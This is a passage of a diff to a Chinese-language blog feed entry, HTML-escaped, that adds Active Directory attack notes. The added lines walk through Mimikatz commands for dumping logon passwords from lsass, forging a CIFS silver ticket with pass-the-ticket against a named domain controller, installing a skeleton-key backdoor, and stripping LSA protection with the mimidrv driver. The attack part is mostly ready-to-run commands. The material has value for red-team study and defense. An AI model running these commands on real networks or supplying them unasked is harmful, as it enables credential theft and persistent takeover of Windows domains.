+为&amp;quot;ldap&amp;quot;服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。&lt;/p&gt;
+&lt;p&gt;利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;步骤(伪造CIFS的白银票据)：&lt;/p&gt;
+&lt;p&gt;1.获取hash sid等信息&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;mimikatz.exe &lt;span class=&#34;s2&#34;&gt;&amp;#34;privilege::debug&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::logonpasswords&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; 1.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;2.伪造白银票据&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参数说明：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/domain：当前域名称
+/sid：SID值，和金票一样取前面一部分
+/target：目标主机，这里是OWA2010SP3.0day.org
+/service：服务名称，这里需要访问共享文件，所以是cifs
+/rc4：目标主机的HASH值
+/user：伪造的用户名
+/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时通过klist查看当前会话的kerberos票据可以看到生成的票据。&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;dir \\OWA2010SP3.0day.org\c$&lt;/code&gt;访问DC的共享文件夹。&lt;/p&gt;
 &lt;h3 id=&#34;skeleton-key&#34;&gt;skeleton key&lt;/h3&gt;
 &lt;p&gt;skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。&lt;/p&gt;
-&lt;h2 id=&#34;ntlm中继&#34;&gt;NTLM中继&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#在域控上安装 skeleton key
+mimikatz.exe privilege::debug &amp;quot;misc::skeleton&amp;quot;
+
+#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
+net use \\WIN-9P499QKTLDO.adtest.com\c$ mimikatz /user:adtest\administrator`
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#适用系统
+windows 8.1
+windows server 2012 及以上` 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
+!+
+!processprotect /process:lsass.exe /remove 
+misc::skeleton`
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ntlm中继&#34;&gt;NTLM中继&lt;/h2&gt;
 &lt;p&gt;挖坑，待补&lt;/p&gt;
 &lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8117&#34;&gt;https://xz.aliyun.com/t/8117&lt;/a&gt;
-&lt;a href=&#34;https://www.freebuf.com/articles/246440.html&#34;&gt;https://www.freebuf.com/articles/246440.html&lt;/a&gt;
-&lt;a href=&#34;https://www.cnblogs.com/bmjoker/p/10355934.html&#34;&gt;https://www.cnblogs.com/bmjoker/p/10355934.html&lt;/a&gt;
-&lt;a href=&#34;https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/&#34;&gt;https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8117&#34;&gt;浅探内网横向移动-Pass The Hash&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/246440.html&#34;&gt;内网横向移动：利用WMI来渗透&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/bmjoker/p/10355934.html&#34;&gt;内网渗透之IPC$入侵&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/&#34;&gt;浅析黄金票据与白银票据&lt;/a&gt;&lt;/p&gt;
 </description>
                 
                 
